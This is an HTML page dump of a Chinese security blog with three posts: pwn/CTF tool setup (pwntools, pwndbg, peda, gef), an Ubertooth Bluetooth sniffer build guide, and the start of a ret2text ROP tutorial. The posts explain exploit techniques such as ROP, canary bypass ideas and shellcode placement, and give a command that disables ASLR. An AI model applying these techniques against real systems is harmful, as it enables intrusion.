+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="devil0x菜鸟">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/10/21/gdb工具pwndbg与peda与gef配置/" itemprop="url">pwn工具配置与使用，并且自动切换gdb脚本</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-21T12:12:26+08:00">
+                2019-10-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><h3 id="基础的ubuntu配置"><a href="#基础的ubuntu配置" class="headerlink" title="基础的ubuntu配置"></a>基础的ubuntu配置</h3><h4 id="1-换国内源"><a href="#1-换国内源" class="headerlink" title="1.换国内源"></a>1.换国内源</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial main</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial main</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial universe</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates universe</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security main</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security universe</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security universe</span><br></pre></td></tr></table></figure>
+<h4 id="2-换终端"><a href="#2-换终端" class="headerlink" title="2.换终端"></a>2.换终端</h4><p> 教程：<a href="https://www.jianshu.com/p/27c8088dc8f7" target="_blank" rel="noopener">https://www.jianshu.com/p/27c8088dc8f7</a> </p>
+<h4 id="2-趁手的python环境"><a href="#2-趁手的python环境" class="headerlink" title="2.趁手的python环境"></a>2.趁手的python环境</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.安装python以及pip</span><br><span class="line">2.首先安装交互式Python版本，ipython，</span><br><span class="line">sudo apt install ipython</span><br></pre></td></tr></table></figure>
+<h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1.前提：python环境，同时需要装python-dev</span><br><span class="line">均使用apt安装的方式</span><br><span class="line"></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install git</span><br><span class="line">sudo apt install python-dev</span><br><span class="line"></span><br><span class="line">2.pip安装（如果pip安装东西慢，可以换源(清华源)）</span><br><span class="line">https://mirrors.tuna.tsinghua.edu.cn/help/pypi/</span><br><span class="line"></span><br><span class="line">3.pwntools安装</span><br><span class="line">1、安装Capstone</span><br><span class="line">Capstone disassembly/disassembler framework: Core (Arm, Arm64, M68K, Mips, PPC, Sparc, SystemZ, X86, X86_64, XCore) + bindings (Python, Java, Ocaml)</span><br><span class="line"></span><br><span class="line">git clone https://github.com/aquynh/capstone</span><br><span class="line">cd capstone</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">2、安装pwntools</span><br><span class="line">在终端输入</span><br><span class="line">git clone https://github.com/Gallopsled/pwntools</span><br><span class="line">cd pwntools</span><br><span class="line">python setup.py install</span><br><span class="line">如果没报错，并且终端输入python进入其交互模式后，输入import pwn回车后没报错，差不多就好了。</span><br><span class="line">这时候再尝试pwntools的asm功能</span><br><span class="line">&gt;&gt;&gt; pwn.asm(&quot;xor eax,eax&quot;)</span><br><span class="line">&apos;1\xc0&apos;</span><br><span class="line">如果有正确输出，即说明这个功能是可以用的，到这里就算安装完成。</span><br><span class="line"></span><br><span class="line">3.64位Ubuntu 16.04运行32位程序</span><br><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo apt install libc6:i386</span><br></pre></td></tr></table></figure>
+<h2 id="checksec详解"><a href="#checksec详解" class="headerlink" title="checksec详解"></a>checksec详解</h2><p>checksec看到的那些参数含义</p>
+<ul>
+<li><p>NX保护：<br>你不能执行我就不执行，栈里面的内容只负责把程序执行流引入到一个需要的汇编代码的位置处，然后调用程序自己的一些代码来实现攻击。你可以调用含有call或者ret代码这样就能一直连接下去。这就是大佬说的ROP链。</p>
+</li>
+<li><p>cannary：<br>函数在执行的时候把一个值放入到栈内的某个位置，我们想要溢出返回地址就要改变这个值，返回的时候系统检查canary值是否改变，如果改变就调用check_failed()函数，打印程序名然后退出。基于这个原理我们可以1、找到canary的值然后填进去。2、可以覆盖掉check_\failed()的调用地址换成system() </p>
+</li>
+<li><p>ASLR</p>
+<p>Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code></p>
+<ul>
+<li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li>
+<li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li>
+<li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li>
+</ul>
+<p>我们可以使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</p>
+</li>
+<li><p>PIE</p>
+<p>在PIE没有开启的情况下，bss段的地址是固定的，所以，可以把shellcode写入bss段，然后跳转到bss段，然后执行shellcode。</p>
+</li>
+</ul>
+<h2 id="pwntools使用教程"><a href="#pwntools使用教程" class="headerlink" title="pwntools使用教程"></a>pwntools使用教程</h2><p>process 指向本地路径<br>remote(“IP”,port)指向地址还有端口<br>p64打包(可以吧数字转换到小端法)，u64解包(还原回去)<br>context.binary= 设置上下文<br>asm</p>
+<p><code>remote(&quot;一个域名或者ip地址&quot;, 端口)</code> 会连接到我们指定的地址及端口。 然后该函数会返回remote对象 (这里，我们将该对象保存到了变量 <code>c</code>). remote对象主要用来进行对远程主机的输入输出. 它有如下几个方法：</p>
+<ul>
+<li><code>send(payload)</code> 发送payload</li>
+<li><code>sendline(payload)</code> 发送payload，并进行换行（末尾<strong>\n</strong>）</li>
+<li><code>sendafter(some_string, payload)</code> 接收到 some_string 后, 发送你的 payload</li>
+<li><code>recvn(N)</code> 接受 N(数字) 字符</li>
+<li><code>recvline()</code> 接收一行输出</li>
+<li><code>recvlines(N)</code> 接收 N(数字) 行输出</li>
+<li><code>recvuntil(some_string)</code> 接收到 some_string 为止</li>
+</ul>
+<h1 id="gdb工具pwndbg与peda与gef配置"><a href="#gdb工具pwndbg与peda与gef配置" class="headerlink" title="gdb工具pwndbg与peda与gef配置"></a>gdb工具pwndbg与peda与gef配置</h1><p>在调试时有时候需要不同功能，在gdb下需要安装两个工具pwndbg和peda，可惜这两个不兼容</p>
+<p>pwndbg在调试堆的数据结构时候很方便</p>
+<p>peda在查找字符串等功能时方便</p>
+<p>安装pwndbg：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
+<p>安装peda：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br><span class="line">echo &quot;DONE! debug your program with gdb and enjoy&quot;</span><br></pre></td></tr></table></figure>
+<p>安装gef：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#自动安装</span><br><span class="line">$ wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh</span><br><span class="line"></span><br><span class="line"># manually</span><br><span class="line">$ wget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.py</span><br><span class="line">$ echo source ~/.gdbinit-gef.py &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
+<p>切换gdb的调试工具pwndbg或peda：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.gdbinitsource ~/peda/peda.py</span><br></pre></td></tr></table></figure>
+<p>把第二行添加到gdbinit的配置文件中去，把pwndbg的注释掉，即可切换为peda</p>
+<p>选中gef的话，即添加一行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.gdbinit-gef.py</span><br></pre></td></tr></table></figure>
+<p>并把其他两行注释掉即可</p>
+<h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><p>然后发现，只要把pwndbg放到最上边，然后其他的插件不用注释也都可以用了。</p>
+<p><img src="http://ww1.sinaimg.cn/large/0063hjnqly1g85td64840j30gg06ywf5.jpg" alt="3.jpg"></p>
+<p>然后虽然显示gef，实际所有功能都有</p>
+<p><img src="http://ww1.sinaimg.cn/large/0063hjnqly1g85tei4jztj30m906075u.jpg" alt="4.jpg"></p>
+<p>gdb切换工具 <a href="https://blog.csdn.net/aptx4869_li/article/details/81566541" target="_blank" rel="noopener">https://blog.csdn.net/aptx4869_li/article/details/81566541</a> </p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://devil0x.github.io/2019/10/17/ubertooth环境搭建手册/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="devil0x">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="devil0x菜鸟">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/10/17/ubertooth环境搭建手册/" itemprop="url">搭建ubertooth环境</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-17T13:20:48+08:00">
+                2019-10-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h1><p>Ubuntu16.04.1</p>
+<p>内核版本4.4.0</p>
+<p><strong>需要用到的环境及工具：</strong></p>
+<blockquote>
+<p>libbtbb<br>Ubertooth tools<br>Wireshark<br>Firmware<br>kismet</p>
+</blockquote>
+<p><strong>官方文档：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/greatscottgadgets/ubertooth/wiki/Build-Guide</span><br></pre></td></tr></table></figure>
+<p>我的教程可能过时，so一切还是参照官方文档。</p>
+<p><strong>0x01 安装依赖库</strong></p>
+<p>在构建libbtbb和Ubertooth工具之前，需要先安装一些依赖。您可以从操作系统的软件包存储库中找到许多这些文件，例如：</p>
+<p><strong>Debian / Ubuntu</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install cmake libusb-1.0-0-dev make gcc g++ libbluetooth-dev \</span><br><span class="line">pkg-config libpcap-dev python-numpy python-pyside python-qt4</span><br></pre></td></tr></table></figure>
+<h2 id="libbtbb"><a href="#libbtbb" class="headerlink" title="libbtbb"></a>libbtbb</h2><p>接下来，需要为Ubertooth工具构建蓝牙基带库（libbtbb），以解码蓝牙数据包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/greatscottgadgets/libbtbb/archive/2018-12-R1.tar.gz -O libbtbb-2018-12-R1.tar.gz</span><br><span class="line">tar -xf libbtbb-2018-12-R1.tar.gz</span><br><span class="line">cd libbtbb-2018-12-R1</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
+<p><strong>Linux用户：</strong>如果是初次安装，或者收到有关查找库的错误，则应运行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure>
+<h2 id="Ubertooth工具"><a href="#Ubertooth工具" class="headerlink" title="Ubertooth工具"></a>Ubertooth工具</h2><p>Ubertooth存储库包含用于嗅探蓝牙数据包，配置Ubertooth和更新固件的主机代码。默认情况下，使用以下方法来构建和安装这三个组件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/greatscottgadgets/ubertooth/releases/download/2018-12-R1/ubertooth-2018-12-R1.tar.xz</span><br><span class="line">tar xf ubertooth-2018-12-R1.tar.xz</span><br><span class="line">cd ubertooth-2018-12-R1/host</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
+<p><strong>Linux用户：</strong>如果是初次安装，或者收到有关查找库的错误，则应运行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure>
+<h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><p>Wireshark 1.12版及更高版本默认包含Ubertooth BLE插件。<a href="https://github.com/greatscottgadgets/ubertooth/wiki/Capturing-BLE-in-Wireshark" target="_blank" rel="noopener">只需</a>做一点工作，就可以将<a href="https://github.com/greatscottgadgets/ubertooth/wiki/Capturing-BLE-in-Wireshark" target="_blank" rel="noopener">BLE从Ubertooth直接捕获到Wireshark中</a></p>
+<p>通过Wireshark BTBB和BR / EDR插件，可以在Wireshark GUI中分析和分析使用Kismet捕获的蓝牙基带流量。它们是与其余Ubertooth和libbtbb软件分开构建的。</p>
+<p>传递给cmake的目录<code>MAKE_INSTALL_LIBDIR</code>因系统而异，但是应该是现有Wireshark插件（例如<code>asn1.so</code>和）的位置<code>ethercat.so</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install wireshark wireshark-dev libwireshark-dev cmake</span><br><span class="line">cd libbtbb-2018-12-R1/wireshark/plugins/btbb</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake -DCMAKE_INSTALL_LIBDIR=/usr/lib/x86_64-linux-gnu/wireshark/libwireshark3/plugins ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
+<p>然后为BT BR / EDR插件重复上述步骤：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install wireshark wireshark-dev libwireshark-dev cmake</span><br><span class="line">cd libbtbb-2018-12-R1/wireshark/plugins/btbredr</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake -DCMAKE_INSTALL_LIBDIR=/usr/lib/x86_64-linux-gnu/wireshark/libwireshark3/plugins ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
+<h1 id="固件问题"><a href="#固件问题" class="headerlink" title="固件问题"></a>固件问题</h1><p>首先，获取<a href="https://github.com/greatscottgadgets/ubertooth/releases/latest" target="_blank" rel="noopener">最新的Ubertooth版本</a>。然后，提取归档文件并更改为directory <code>ubertooth-one-firmware-bin</code>。</p>
+<p>然后，您可以<code>ubertooth-dfu</code>像这样运行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ubertooth-dfu -d bluetooth_rxtx.dfu -r</span><br></pre></td></tr></table></figure>
+<p>设备将自动进入DFU模式并刷新固件。</p>
+<p>如果<code>control message unsupported</code>最后看到，则意味着重置设备失败。您可以通过运行<code>ubertooth-util -r</code>USB电缆或从Ubertooth上拔下USB电缆并重新连接来解决此问题。</p>
+<p><strong>故障排除：</strong></p>
+<p>如果您遇到诸如“  libUSB Error: Command Error: (-1) ”之类的错误，或者相邻的Ubertooth的4个LED执行独特的跟踪模式，请在提取最新Ubertooth版本的存档后，转到<code>firmware</code>目录。然后，运行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make clean all &amp;&amp; make</span><br><span class="line">ubertooth-dfu -r -d bluetooth_rxtx/bluetooth_rxtx.dfu</span><br></pre></td></tr></table></figure>
+<p>如果您的Ubertooth Ones没有固件或固件损坏，并且在发行时没有出现<code>lsusb</code>，您可以通过连接EXPAND接头上的针脚1和2将Ubertooth One强制进入DFU模式（请参阅<a href="https://pbs.twimg.com/profile_banners/19587312/1354079866/1500x500" target="_blank" rel="noopener">https://pbs.twimg.com/ profile_banners / 19587312/1354079866 / 1500x500</a>），并应在dmesg中看到以下内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[ 1323.391369] usb 1-10: new full-speed USB device number 7 using xhci_hcd</span><br><span class="line">[ 1323.541063] usb 1-10: New USB device found, idVendor=1d50, idProduct=6002, bcdDevice= 1.05</span><br><span class="line">[ 1323.541069] usb 1-10: New USB device strings: Mfr=1, Product=2, SerialNumber=3</span><br><span class="line">[ 1323.541073] usb 1-10: Product: Ubertooth One</span><br><span class="line">[ 1323.541077] usb 1-10: Manufacturer: Great Scott Gadgets</span><br><span class="line">[ 1323.541080] usb 1-10: SerialNumber: 07b00004c81435ae82624953861e00f5</span><br><span class="line">[ 1341.978766] usb 1-10: USB disconnect, device number 7</span><br></pre></td></tr></table></figure>
+<p>设备将仅在dfu模式下停留几秒钟，因此您必须快速发出ubertooth-dfu命令进行刷新。</p>
+<h2 id="我正在运行什么版本？"><a href="#我正在运行什么版本？" class="headerlink" title="我正在运行什么版本？"></a>我正在运行什么版本？</h2><p>在非DFU模式下，您可以使用来获取固件信息<code>ubertooth-util -v</code>。请注意，显示的版本应与您刚安装的版本匹配：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ubertooth-util -v</span><br><span class="line">Firmware version: 2018-12-R1 (API:1.05)</span><br><span class="line">$ ubertooth-util -V</span><br><span class="line">ubertooth 2018-12-R1 (mikeryan@steel) Tue Aug  7 15:33:06 PDT 2018</span><br></pre></td></tr></table></figure>
+<h1 id="开发固件"><a href="#开发固件" class="headerlink" title="开发固件"></a>开发固件</h1><p>您将需要一个支持ARM Cortex-M3的工具链。固件目录中的Makefile文件专门用于GCC和基于Linux的工具链<code>arm-none-eabi-gcc and libnewlib-arm-none-eabi</code>。如果您正在运行基于Debian的发行版，则可以运行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc-arm-none-eabi libnewlib-arm-none-eabi</span><br></pre></td></tr></table></figure>
+<p>否则，可以从<a href="https://launchpad.net/gcc-arm-embedded下载，只需解压缩存档并将bin目录添加到PATH。" target="_blank" rel="noopener">https://launchpad.net/gcc-arm-embedded下载，只需解压缩存档并将bin目录添加到PATH。</a></p>
+<p>要构建固件，请从克隆或解压缩源的目录开始，然后运行以下命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd firmware/bluetooth_rxtx/</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+<p>这将产生一个名为的文件<code>bluetooth_rxtx.dfu</code>，可以使用将该文件写入Ubertooth。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubertooth-dfu -d bluetooth_rxtx.dfu -r</span><br></pre></td></tr></table></figure>
+<p>尽管可以从发行版下载中找到固件源和二进制映像，但是如果您打算修改固件，则可能需要git中的新鲜代码。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://devil0x.github.io/2019/10/14/PWN入门学习(2)基本的ROP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="devil0x">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="devil0x菜鸟">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/10/14/PWN入门学习(2)基本的ROP/" itemprop="url">pwn入门学习(2)pwn-wiki（basic ROP)</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-14T03:25:41+08:00">
+                2019-10-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="基本-ROP"><a href="#基本-ROP" class="headerlink" title="基本 ROP"></a>基本 ROP</h1><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
+<h4 id="0x01-checksec看到的那些参数含义"><a href="#0x01-checksec看到的那些参数含义" class="headerlink" title="0x01.checksec看到的那些参数含义"></a>0x01.checksec看到的那些参数含义</h4><ul>
+<li><p>NX保护：<br>你不能执行我就不执行，栈里面的内容只负责把程序执行流引入到一个需要的汇编代码的位置处，然后调用程序自己的一些代码来实现攻击。你可以调用含有call或者ret代码这样就能一直连接下去。这就是大佬说的ROP链。</p>
+</li>
+<li><p>cannary：<br>函数在执行的时候把一个值放入到栈内的某个位置，我们想要溢出返回地址就要改变这个值，返回的时候系统检查canary值是否改变，如果改变就调用check_failed()函数，打印程序名然后退出。基于这个原理我们可以1、找到canary的值然后填进去。2、可以覆盖掉check_\failed()的调用地址换成system() </p>
+</li>
+<li><p>ASLR</p>
+<p>Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code></p>
+<ul>
+<li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li>
+<li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li>
+<li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li>
+</ul>
+<p>我们可以使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</p>
+</li>
+<li><p>PIE</p>
+<p>在PIE没有开启的情况下，bss段的地址是固定的，所以，可以把shellcode写入bss段，然后跳转到bss段，然后执行shellcode。</p>
+</li>
+</ul>
+<h4 id="0x02-指针的含义"><a href="#0x02-指针的含义" class="headerlink" title="0x02.指针的含义"></a>0x02.指针的含义</h4><ul>
+<li>esp是栈顶指针</li>
+<li>ebp是栈底指针 </li>
+</ul>
+<h2 id="CTF-Wiki"><a href="#CTF-Wiki" class="headerlink" title="CTF-Wiki"></a>CTF-Wiki</h2><h3 id="1-ret2text"><a href="#1-ret2text" class="headerlink" title="1.ret2text"></a>1.ret2text</h3><p>首先，查看一下程序的保护机制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ret2text checksec ret2text</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>–该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p>
